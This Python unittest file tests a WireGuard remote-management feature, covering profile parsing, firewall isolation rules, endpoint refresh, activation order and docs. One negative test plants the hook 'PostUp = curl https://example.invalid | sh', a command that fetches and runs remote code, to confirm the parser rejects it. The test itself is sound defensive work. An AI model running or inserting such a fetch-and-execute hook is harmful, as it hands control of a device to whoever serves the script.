import os
import importlib.util
import subprocess
import tempfile
import unittest
from pathlib import Path


ROOT = Path(__file__).resolve().parents[1]
SETUP = ROOT / "scripts" / "setup-wireguard-management.sh"
FIREWALL = ROOT / "scripts" / "pcs-wireguard-firewall.sh"
ENDPOINT_REFRESH = ROOT / "scripts" / "pcs-wireguard-endpoint-refresh.sh"
SERVICE = ROOT / "systemd" / "pcs-wireguard-firewall.service"
ENDPOINT_REFRESH_SERVICE = ROOT / "systemd" / "pcs-wireguard-endpoint-refresh.service"
ENDPOINT_REFRESH_TIMER = ROOT / "systemd" / "pcs-wireguard-endpoint-refresh.timer"
DISPATCHER = ROOT / "networkmanager" / "90-pcs-wireguard-firewall"
EXAMPLE = ROOT / "config" / "pcs-wireguard-management.example.conf"
DOC = ROOT / "docs" / "wireguard-remote-management.md"
ROADMAP = ROOT / "docs" / "remote-management-api-android-roadmap.md"
BASE_SETUP = ROOT / "scripts" / "setup-pcs-base.sh"
SCRIPT_DOC = ROOT / "scripts" / "README.md"
SELF_TEST = ROOT / "scripts" / "pcs-self-test.sh"
STATUS = ROOT / "scripts" / "pcs-status.sh"
PROFILE_HELPER = ROOT / "scripts" / "pcs_wireguard_profile.py"

PROFILE_SPEC = importlib.util.spec_from_file_location("pcs_wireguard_profile", PROFILE_HELPER)
PROFILE_MODULE = importlib.util.module_from_spec(PROFILE_SPEC)
assert PROFILE_SPEC.loader is not None
PROFILE_SPEC.loader.exec_module(PROFILE_MODULE)

PRIVATE_KEY = "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA="
PUBLIC_KEY = "AQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQE="
PRESHARED_KEY = "AgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgI="
VALID_PROFILE = f"""\
[Interface]
Address = 10.77.0.20/32
PrivateKey = {PRIVATE_KEY}
DNS = 10.77.0.1

[Peer]
PublicKey = {PUBLIC_KEY}
PresharedKey = {PRESHARED_KEY}
Endpoint = vpn.example.net:51820
AllowedIPs = 10.77.0.1/32
PersistentKeepalive = 25
"""


VALID_FIREWALL_CONFIG = """\
PCS_WG_ADDRESS="10.77.0.20/32"
PCS_WG_ALLOWED_IPS="10.77.0.1/32,10.77.0.10/32"
PCS_WG_ADMIN_SOURCES="10.77.0.1/32"
PCS_WG_INTERFACE="wg-pcs"
PCS_WG_LAN_INTERFACE="eth0"
PCS_WG_LAN_NETWORK="10.42.0.0/24"
PCS_WG_HOME_INTERFACE=""
PCS_WG_HOME_NETWORK=""
PCS_WG_PROTECTED_TCP_PORTS="22,80,139,443,445,8080,9090"
"""


class WireGuardManagementTests(unittest.TestCase):
    def test_runtime_scripts_include_standard_administrative_path(self):
        for relative_path in (
            "scripts/setup-wireguard-management.sh",
            "scripts/pcs-wireguard-firewall.sh",
            "scripts/pcs-wireguard-endpoint-refresh.sh",
        ):
            source = (ROOT / relative_path).read_text(encoding="utf-8")
            self.assertIn("/usr/sbin:/usr/bin:/sbin:/bin", source)
            self.assertIn("export PATH", source)

    def test_feature_is_default_off_and_wired_into_base_installer(self):
        base = BASE_SETUP.read_text(encoding="utf-8")
        documentation = DOC.read_text(encoding="utf-8")

        self.assertIn('PCS_SETUP_WIREGUARD="${PCS_SETUP_WIREGUARD:-ask}"', base)
        self.assertIn('PCS_SETUP_WIREGUARD="no"', base)
        self.assertIn('private-config/wg-pcs.conf', base)
        self.assertIn('setup-wireguard-management.sh --validate-profile', base)
        self.assertIn('setup-wireguard-management.sh --import-profile', base)
        self.assertIn('setup-wireguard-management.sh --activate', base)
        self.assertIn('setup-wireguard-management.sh --check', base)
        self.assertIn('setup-wireguard-management.sh --rollback', base)
        self.assertIn("operator explicitly", documentation)
        self.assertIn("commissioned PCS", documentation)

    def test_profile_parser_accepts_safe_single_peer_and_separates_private_key(self):
        with tempfile.TemporaryDirectory() as temp_dir:
            temp = Path(temp_dir)
            profile_path = temp / "wg-pcs.conf"
            policy_path = temp / "policy.conf"
            key_path = temp / "private.key"
            preshared_key_path = temp / "preshared.key"
            profile_path.write_text(VALID_PROFILE, encoding="utf-8")

            parsed = PROFILE_MODULE.parse_profile(profile_path)
            PROFILE_MODULE.write_import_files(
                parsed, policy_path, key_path, preshared_key_path
            )

            policy = policy_path.read_text(encoding="utf-8")
            self.assertIn("PCS_WG_ADDRESS=10.77.0.20/32", policy)
            self.assertIn("PCS_WG_ALLOWED_IPS=10.77.0.1/32", policy)
            self.assertIn("PCS_WG_ADMIN_SOURCES=10.77.0.1/32", policy)
            self.assertIn("PCS_WG_HOME_INTERFACE=''", policy)
            self.assertIn("PCS_WG_HOME_NETWORK=''", policy)
            self.assertIn("PCS_WG_USE_PRESHARED_KEY=yes", policy)
            self.assertIn(
                "PCS_WG_PRESHARED_KEY_FILE=/etc/pcs/wireguard/preshared.key", policy
            )
            self.assertNotIn(PRIVATE_KEY, policy)
            self.assertNotIn(PRESHARED_KEY, policy)
            self.assertNotIn("PCS_WG_DNS", policy)
            self.assertEqual("10.77.0.1", parsed["ignored_dns"])
            self.assertEqual(f"{PRIVATE_KEY}\n", key_path.read_text(encoding="ascii"))
            self.assertEqual(
                f"{PRESHARED_KEY}\n",
                preshared_key_path.read_text(encoding="ascii"),
            )

    def test_profile_parser_keeps_dns_and_preshared_key_optional(self):
        profile_without_optional_fields = VALID_PROFILE.replace(
            "DNS = 10.77.0.1\n", ""
        ).replace(f"PresharedKey = {PRESHARED_KEY}\n", "")
        with tempfile.TemporaryDirectory() as temp_dir:
            temp = Path(temp_dir)
            profile_path = temp / "wg-pcs.conf"
            policy_path = temp / "policy.conf"
            key_path = temp / "private.key"
            preshared_key_path = temp / "preshared.key"
            profile_path.write_text(profile_without_optional_fields, encoding="utf-8")

            parsed = PROFILE_MODULE.parse_profile(profile_path)
            PROFILE_MODULE.write_import_files(
                parsed, policy_path, key_path, preshared_key_path
            )

            self.assertEqual("", parsed["ignored_dns"])
            self.assertEqual("", parsed["preshared_key"])
            self.assertIn(
                "PCS_WG_USE_PRESHARED_KEY=no",
                policy_path.read_text(encoding="utf-8"),
            )
            self.assertEqual("", preshared_key_path.read_text(encoding="ascii"))

    def test_profile_parser_rejects_wg_quick_hooks_extra_peers_and_unsafe_routes(self):
        invalid_profiles = {
            "command hook": VALID_PROFILE.replace(
                f"PrivateKey = {PRIVATE_KEY}",
                f"PrivateKey = {PRIVATE_KEY}\nPostUp = curl https://example.invalid | sh",
            ),
            "default route": VALID_PROFILE.replace("10.77.0.1/32", "0.0.0.0/0"),
            "broad route": VALID_PROFILE.replace("10.77.0.1/32", "10.77.0.0/24"),
            "home route": VALID_PROFILE.replace("10.77.0.1/32", "192.168.1.1/32"),
            "self route": VALID_PROFILE.replace("10.77.0.1/32", "10.77.0.20/32"),
            "extra peer": VALID_PROFILE + f"\n[Peer]\nPublicKey = {PUBLIC_KEY}\n",
            "external DNS": VALID_PROFILE.replace("DNS = 10.77.0.1", "DNS = 8.8.8.8"),
            "multiple DNS": VALID_PROFILE.replace(
                "DNS = 10.77.0.1", "DNS = 10.77.0.1,1.1.1.1"
            ),
            "malformed PSK": VALID_PROFILE.replace(
                f"PresharedKey = {PRESHARED_KEY}", "PresharedKey = not-a-key"
            ),
        }
        with tempfile.TemporaryDirectory() as temp_dir:
            profile_path = Path(temp_dir) / "wg-pcs.conf"
            for label, profile in invalid_profiles.items():
                with self.subTest(label=label):
                    profile_path.write_text(profile, encoding="utf-8")
                    with self.assertRaises(PROFILE_MODULE.ProfileError):
                        PROFILE_MODULE.parse_profile(profile_path)

    def test_example_is_split_tunnel_and_contains_no_private_key(self):
        example = EXAMPLE.read_text(encoding="utf-8")

        self.assertIn('PCS_WG_ADDRESS="10.77.0.20/32"', example)
        self.assertIn('PCS_WG_ALLOWED_IPS="10.77.0.1/32"', example)
        self.assertIn('PCS_WG_ADMIN_SOURCES="10.77.0.1/32"', example)
        self.assertIn('PCS_WG_PERSISTENT_KEEPALIVE="25"', example)
        self.assertIn('PCS_WG_HUB_PUBLIC_KEY="CHANGE_ME"', example)
        self.assertNotIn("PCS_WG_PRIVATE_KEY=", example)
        self.assertNotIn("0.0.0.0/0", example)
        self.assertNotIn("::/0", example)
        self.assertNotIn("192.168.", example)

    def test_firewall_enforces_asymmetric_trust_boundary(self):
        firewall = FIREWALL.read_text(encoding="utf-8")

        self.assertIn('entries must be explicit IPv4 /32 host routes', firewall)
        self.assertIn('every admin source must also appear in PCS_WG_ALLOWED_IPS', firewall)
        self.assertIn("must share the WireGuard address's management /24", firewall)
        self.assertIn("must exactly cover SSH, web/admin, Samba, redirect, and Cockpit", firewall)
        self.assertIn('iifname "${LAN_INTERFACE}" oifname "${WG_INTERFACE}" drop', firewall)
        self.assertIn('iifname "${WG_INTERFACE}" drop', firewall)
        self.assertIn('oifname "${WG_INTERFACE}" drop', firewall)
        self.assertIn('ip saddr @admin_sources ip daddr ${LAN_NETWORK}', firewall)
        self.assertIn('tcp dport @protected_tcp_ports drop', firewall)
        self.assertIn('home_input_rule="tcp dport @protected_tcp_ports iifname', firewall)
        self.assertIn('comment \\"pcs-wg-home-management\\"', firewall)
        self.assertIn("139,443,445", firewall)

    def test_home_wifi_management_is_explicit_and_cellular_remains_excluded(self):
        firewall = FIREWALL.read_text(encoding="utf-8")
        example = EXAMPLE.read_text(encoding="utf-8")
        self.assertIn('HOME_INTERFACE="${PCS_WG_HOME_INTERFACE:-}"', firewall)
        self.assertIn('HOME_NETWORK="${PCS_WG_HOME_NETWORK:-}"', firewall)
        self.assertIn('home_interface != "wlan0"', firewall)
        self.assertIn("private IPv4 /16 or narrower", firewall)
        self.assertIn('PCS_WG_HOME_INTERFACE=""', example)
        self.assertIn('PCS_WG_HOME_NETWORK=""', example)
        self.assertNotIn("wwan0", example)

    def test_networkmanager_compatibility_is_idempotent_and_refreshed(self):
        firewall = FIREWALL.read_text(encoding="utf-8")
        dispatcher = DISPATCHER.read_text(encoding="utf-8")

        self.assertIn('NM_TABLE="nm-shared-${LAN_INTERFACE}"', firewall)
        self.assertIn("delete_nm_compat_rules", firewall)
        self.assertIn('comment "pcs-wg-to-lan"', firewall)
        self.assertIn('comment "pcs-wg-from-lan"', firewall)
        self.assertIn("systemctl is-active --quiet pcs-wireguard-firewall.service", dispatcher)
        self.assertIn("pcs-wireguard-firewall --refresh-networkmanager", dispatcher)
        self.assertIn("systemctl --no-block start wg-quick@wg-pcs.service", dispatcher)
        self.assertIn("systemctl --no-block start pcs-wireguard-endpoint-refresh.service", dispatcher)
        self.assertNotIn("nmcli connection up", dispatcher)
        self.assertIn("refusing to add NetworkManager compatibility rules without the PCS isolation table", firewall)

    def test_ddns_endpoint_refresh_is_ipv4_only_periodic_and_lifecycle_managed(self):
        setup = SETUP.read_text(encoding="utf-8")
        helper = ENDPOINT_REFRESH.read_text(encoding="utf-8")
        service = ENDPOINT_REFRESH_SERVICE.read_text(encoding="utf-8")
        timer = ENDPOINT_REFRESH_TIMER.read_text(encoding="utf-8")

        self.assertIn("socket.AF_INET", helper)
        self.assertNotIn("socket.AF_INET6", helper)
        self.assertIn('wg set "${interface}" peer "${peer_key}" endpoint', helper)
        self.assertNotIn("ip route", helper)
        self.assertIn("ConditionPathExists=/sys/class/net/wg-pcs", service)
        self.assertIn("OnUnitActiveSec=5min", timer)
        self.assertIn("pcs-wireguard-endpoint-refresh.timer", setup)
        self.assertIn("sudo systemctl start pcs-wireguard-endpoint-refresh.service", setup)
        self.assertIn("sudo systemctl disable --now pcs-wireguard-endpoint-refresh.timer", setup)

    def test_activation_is_firewall_first_handshake_gated_and_reversible(self):
        setup = SETUP.read_text(encoding="utf-8")
        service = SERVICE.read_text(encoding="utf-8")

        firewall_start = setup.index("sudo systemctl start pcs-wireguard-firewall.service")
        tunnel_start = setup.index('sudo systemctl start "wg-quick@${WG_INTERFACE}.service"')
        handshake_wait = setup.index("Waiting up to ${timeout} seconds")
        rollback = setup.index("no authenticated WireGuard handshake was observed")

        self.assertLess(firewall_start, tunnel_start)
        self.assertLess(tunnel_start, handshake_wait)
        self.assertLess(handshake_wait, rollback)
        self.assertIn("deactivate_feature", setup[rollback:])
        self.assertIn("Before=wg-quick@wg-pcs.service", service)
        self.assertIn("Requires=pcs-wireguard-firewall.service", setup)

    def test_asus_dns_is_discarded_and_preshared_key_remains_root_only(self):
        setup = SETUP.read_text(encoding="utf-8")
        helper = PROFILE_HELPER.read_text(encoding="utf-8")
        documentation = DOC.read_text(encoding="utf-8")

        self.assertIn('"DNS"', helper)
        self.assertIn('"PresharedKey"', helper)
        self.assertIn('"ignored_dns": ignored_dns', helper)
        self.assertIn("/etc/pcs/wireguard/preshared.key", setup)
        self.assertIn('PresharedKey = ${preshared_key}', setup)
        self.assertIn("validated ASUS DNS entry was deliberately not applied", setup)
        self.assertIn("ASUS", documentation)
        self.assertIn("root-only", documentation)

    def test_setup_accepts_scoped_passwordless_sudo_without_skipping_normal_auth(self):
        setup = SETUP.read_text(encoding="utf-8")

        self.assertIn("require_sudo()", setup)
        self.assertIn("if ! sudo -n true", setup)
        self.assertIn("sudo -v", setup)
        sudo_validation_lines = [
            line
            for line in setup.splitlines()
            if "sudo -v" in line and not line.lstrip().startswith("#")
        ]
        self.assertEqual(["        sudo -v"], sudo_validation_lines)

    def test_activation_cannot_create_default_or_home_lan_routes(self):
        setup = SETUP.read_text(encoding="utf-8")
        documentation = DOC.read_text(encoding="utf-8")

        self.assertIn('ip -4 route show default dev "${WG_INTERFACE}"', setup)
        self.assertIn('ip -6 route show default dev "${WG_INTERFACE}"', setup)
        self.assertIn("private key must use the fixed root-only path", setup)
        self.assertIn("AllowedIPs = ${PCS_WG_ALLOWED_IPS}", setup)
        self.assertIn("never sees its address", documentation)
        self.assertIn("PCS LAN clients cannot initiate", documentation)
        self.assertNotIn("nmcli connection up", setup)
        self.assertNotIn("setup-cellular-profile", setup)

    def test_every_setup_command_is_documented(self):
        setup = SETUP.read_text(encoding="utf-8")
        script_doc = SCRIPT_DOC.read_text(encoding="utf-8")
        feature_doc = DOC.read_text(encoding="utf-8")
        commands = {
            "--prepare",
            "--validate-profile",
            "--import-profile",
            "--generate-key",
            "--validate-config",
            "--configure",
            "--activate",
            "--check",
            "--deactivate",
            "--rollback",
            "--help",
        }

        for command in commands:
            with self.subTest(command=command):
                self.assertIn(command, setup)
                self.assertIn(command, script_doc)
                self.assertIn(command, feature_doc)

    def test_android_roadmap_forbids_ssh_scraping_and_arbitrary_shell(self):
        roadmap = ROADMAP.read_text(encoding="utf-8")

        self.assertIn("It should not open SSH sessions", roadmap)
        self.assertIn("versioned PCS API", roadmap)
        self.assertIn("There will be no arbitrary shell endpoint", roadmap)
        self.assertIn("hardware-backed Keystore", roadmap)
        self.assertIn("HTTPS", roadmap)
        self.assertIn("supervised RF/privacy review", roadmap)

    def test_status_and_self_test_are_conditional_but_enforce_active_safety(self):
        self_test = SELF_TEST.read_text(encoding="utf-8")
        status = STATUS.read_text(encoding="utf-8")

        self.assertIn('skip "WireGuard management has no activated runtime configuration"', self_test)
        self.assertIn('sudo -n test -f "${PCS_WIREGUARD_RUNTIME_CONFIG}"', self_test)
        self.assertIn("Configured WireGuard management requires an enabled, active isolation firewall", self_test)
        self.assertIn("an offline hostname endpoint will retry", self_test)
        self.assertIn("WireGuard management must not install a default route", self_test)
        self.assertIn("has no recorded handshake", self_test)
        self.assertIn("WireGuard pre-shared key is present with root-only permissions", self_test)
        self.assertIn("WireGuard IPv4 DDNS endpoint refresh is installed, enabled, and active", self_test)
        self.assertIn("WireGuard peer endpoint is resolved over IPv4", self_test)
        self.assertIn('WIREGUARD_STATUS="not configured"', status)
        self.assertIn('WIREGUARD_STATUS="active split tunnel"', status)
        self.assertIn('WIREGUARD_STATUS="SAFETY ERROR: default route installed"', status)

    @unittest.skipIf(os.name == "nt", "Bash validator execution runs in Linux CI")
    def test_validator_accepts_explicit_management_host_routes(self):
        result = self._run_firewall_validator(VALID_FIREWALL_CONFIG)
        self.assertEqual(0, result.returncode, result.stderr)
        self.assertIn("configuration is valid", result.stdout)

    @unittest.skipIf(os.name == "nt", "Bash validator execution runs in Linux CI")
    def test_validator_rejects_default_and_broad_routes(self):
        for invalid_route in ("0.0.0.0/0", "10.77.0.0/24", "192.168.1.0/24"):
            config = VALID_FIREWALL_CONFIG.replace(
                'PCS_WG_ALLOWED_IPS="10.77.0.1/32,10.77.0.10/32"',
                f'PCS_WG_ALLOWED_IPS="{invalid_route}"',
            ).replace(
                'PCS_WG_ADMIN_SOURCES="10.77.0.1/32"',
                f'PCS_WG_ADMIN_SOURCES="{invalid_route}"',
            )
            with self.subTest(invalid_route=invalid_route):
                result = self._run_firewall_validator(config)
                self.assertNotEqual(0, result.returncode)
                self.assertIn("explicit IPv4 /32", result.stderr)

    @unittest.skipIf(os.name == "nt", "Bash validator execution runs in Linux CI")
    def test_validator_rejects_admin_source_outside_allowed_ips(self):
        config = VALID_FIREWALL_CONFIG.replace(
            'PCS_WG_ADMIN_SOURCES="10.77.0.1/32"',
            'PCS_WG_ADMIN_SOURCES="10.77.0.99/32"',
        )
        result = self._run_firewall_validator(config)
        self.assertNotEqual(0, result.returncode)
        self.assertIn("admin source", result.stderr)

    @unittest.skipIf(os.name == "nt", "Bash validator execution runs in Linux CI")
    def test_validator_rejects_host_route_outside_management_subnet(self):
        config = VALID_FIREWALL_CONFIG.replace(
            'PCS_WG_ALLOWED_IPS="10.77.0.1/32,10.77.0.10/32"',
            'PCS_WG_ALLOWED_IPS="10.77.0.1/32,203.0.113.10/32"',
        )
        result = self._run_firewall_validator(config)
        self.assertNotEqual(0, result.returncode)
        self.assertIn("management /24", result.stderr)

    @unittest.skipIf(os.name == "nt", "Bash validator execution runs in Linux CI")
    def test_validator_accepts_narrow_home_wifi_and_rejects_unsafe_home_sources(self):
        valid = VALID_FIREWALL_CONFIG.replace(
            'PCS_WG_HOME_INTERFACE=""\nPCS_WG_HOME_NETWORK=""',
            'PCS_WG_HOME_INTERFACE="wlan0"\nPCS_WG_HOME_NETWORK="192.168.50.0/24"',
        )
        result = self._run_firewall_validator(valid)
        self.assertEqual(0, result.returncode, result.stderr)

        invalid_configs = {
            "cellular interface": valid.replace('PCS_WG_HOME_INTERFACE="wlan0"', 'PCS_WG_HOME_INTERFACE="wwan0"'),
            "public network": valid.replace('PCS_WG_HOME_NETWORK="192.168.50.0/24"', 'PCS_WG_HOME_NETWORK="8.8.8.0/24"'),
            "broad network": valid.replace('PCS_WG_HOME_NETWORK="192.168.50.0/24"', 'PCS_WG_HOME_NETWORK="10.0.0.0/8"'),
            "missing pair": valid.replace('PCS_WG_HOME_NETWORK="192.168.50.0/24"', 'PCS_WG_HOME_NETWORK=""'),
        }
        for label, config in invalid_configs.items():
            with self.subTest(label=label):
                rejected = self._run_firewall_validator(config)
                self.assertNotEqual(0, rejected.returncode)

    @staticmethod
    def _run_firewall_validator(config_text):
        with tempfile.TemporaryDirectory() as temp_dir:
            temp = Path(temp_dir)
            config = temp / "wireguard.conf"
            fake_bin = temp / "bin"
            fake_nft = fake_bin / "nft"
            fake_bin.mkdir()
            config.write_text(config_text, encoding="utf-8")
            fake_nft.write_text("#!/bin/sh\nexit 0\n", encoding="utf-8")
            fake_nft.chmod(0o755)

            env = os.environ.copy()
            env["PCS_WIREGUARD_CONFIG"] = str(config)
            env["PATH"] = f"{fake_bin}{os.pathsep}{env['PATH']}"
            return subprocess.run(
                ["bash", str(FIREWALL), "--validate-config"],
                cwd=ROOT,
                env=env,
                text=True,
                capture_output=True,
                check=False,
            )


if __name__ == "__main__":
    unittest.main()
